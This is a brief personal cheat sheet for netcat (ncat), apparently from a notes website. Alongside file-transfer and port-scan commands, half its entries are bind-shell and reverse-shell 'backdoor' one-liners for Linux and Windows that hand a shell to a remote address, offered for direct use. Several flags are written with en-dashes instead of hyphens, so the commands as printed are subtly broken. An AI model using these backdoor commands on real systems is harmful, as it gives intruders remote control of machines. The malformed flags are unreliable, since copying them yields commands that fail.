---
layout: notes
permalink: /notes/cheat/ncat/
title: ncat Cheat Sheet
---

# ncat Cheat Sheet
### Netcat allows transfer files to ↔️ from destination. Create connections to ↔️ from machines.
```bash
#Push file from client to listener
nc –l -p [LocalPort] > [outfile]

#Pull file from listener to client
nc –l -p [LocalPort] < [infile]

#Banner Grab
nc –v –n –z –w1 [TargetIPaddr] [start_port]-[end_port]

#Linux - Create Backdoor
nc –l –p [LocalPort] –e /bin/bash

#Linux - Reverse Backdoor
nc [YourIPaddr] [port] –e /bin/bash

#Windows - Create Backdoor
nc –l –p [LocalPort] –e cmd.exe

#Windows - Reverse Backdoor
nc [YourIPaddr] [port] –e cmd.exe
```